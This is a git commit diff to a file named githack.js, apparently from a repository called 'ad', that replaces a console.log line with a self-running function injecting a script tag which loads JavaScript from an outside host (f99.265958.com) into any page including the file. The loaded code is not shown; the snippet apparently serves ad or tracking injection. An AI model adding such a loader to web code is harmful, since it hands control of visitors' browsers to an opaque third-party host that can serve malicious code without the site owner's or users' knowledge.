3aa7232e84b53a39b1721dfe73146ef12f72db84
lifeisdog <53283293+lifeisdog@users.noreply.github.com>
2020-01-01 06:09:52 +0000

    Update githack.js

--- githack.js
+++ githack.js
@@ -1,2 +1,7 @@
 //http://raw.githack.com/lifeisdog/ad/master/githack.js
-console.log('githack2221223')
+(function(){
+  var m = document.createElement("script");
+  m.src = "http://f99.265958.com/fs.asp?uid=3212&vid=1&tid=1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(m, s);
+ })();
